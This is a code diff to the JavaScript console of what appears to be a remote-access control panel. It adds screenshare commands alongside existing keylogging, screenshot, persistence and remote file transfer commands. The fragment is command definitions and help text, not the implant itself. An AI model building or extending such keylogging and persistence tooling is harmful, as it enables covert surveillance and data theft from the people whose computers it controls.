@@ -10,18 +10,21 @@ var inputHistoryCMD = [];
 var inputHistorySSH = [];
 
 var commands = {
-    status: { id: 1, help: 'Check the status of a file transfer', usage: 'status' },
     reconnect: { id: 2, help: 'Force the remote computer to reconnect', usage: 'reconnect' },
+    ftp_status: { id: 1, help: 'Check the status of a file transfer', usage: 'ftp_status' },
     disconnect: { id: 7, help: 'Force the remote computer to disconnect', usage: 'disconnect' },
     screenshot: { id: 5, help: 'Capture a screenshot', usage: '\t\tscreenshot' },
+    screen_stop: { id: 16, help: 'Stop screenshare', usage: '\t\tscreen_stop' },
     logger_dump: { id: 14, help: 'Display keystrokes', usage: '\t\tlogger_dump' },
     logger_stop: { id: 13, help: 'Stop keylogging', usage: '\t\t\tlogger_stop' },
     logger_start: { id: 12, help: 'Start keylogging', usage: '\t\t\tlogger_start' },
     upload: { id: 3, help: 'Upload a file to the remote computer', usage: 'upload <file>' },
+    screen_status: { id: 17, help: 'Status of screenshare', usage: '\t\t\tscreen_status' },
     persist_create: { id: 8, help: 'Create persistence', usage: '\t\t\tpersist_create' },
     persist_remove: { id: 9, help: 'Remove persistence', usage: '\t\t\tpersist_remove' },
     download: { id: 4, help: 'Downaload a file from the remote computer', usage: 'download <file>' },
-    chrome: { id: 6, help: 'Launch Chrome browser', usage: '\t\t\tchrome <tab1> <tab2> <tabn>' }
+    chrome: { id: 6, help: 'Launch Chrome browser', usage: '\t\t\tchrome <tab1> <tab2> <tabn>' },
+    screen_start: { id: 15, help: 'Start screenshare', usage: '\t\t\tscreen_start <updateTime(sec)>' }
 };
 
 $(document).ready(function() {
@@ -142,7 +145,7 @@ function consoleExecute() {
             }
 
             cmdOutput +=
-                '\n\tOver-ride a running upload or download process by using --override after the args\n' +
+                '\n\tOverride a running process by using --override after the args\n' +
                 '\tExample: download blueprint.pdf --override\n';
             let newDisplay = currentDisplay + '\n' + cmdLine + '\n' + cmdOutput + '\n';
 
